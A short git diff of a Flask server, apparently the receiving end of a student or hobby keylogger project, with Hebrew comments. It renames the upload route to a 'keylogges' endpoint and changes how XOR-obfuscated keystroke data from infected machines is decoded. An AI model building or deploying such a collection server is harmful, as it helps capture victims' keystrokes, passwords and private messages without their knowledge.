@@ -9,16 +9,15 @@ app = Flask(__name__)
 # DATA_FOLDER יכיל את הנתיב המלא לתיקייה הראשית
 DATA_FOLDER = os.path.abspath("data")
 os.makedirs(DATA_FOLDER, exist_ok=True)
-
 @app.route('/')
 def home():
     return 'KeyLogger server is running'
 
-@app.route('/api/upload', methods=['POST'])
-def upload():
+@app.route('/api/keylogges', methods=['POST'])
+def keylogges():
     # קבלת JSON
     encrypted_data = request.get_json(silent=True)
-    data = decryption.Encryptor().encryption_using_xor(encrypted_data['data'], 4)
+    data = decryption.Encryptor().encryption_using_xor(encrypted_data, 4)
 
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid data"}), 400
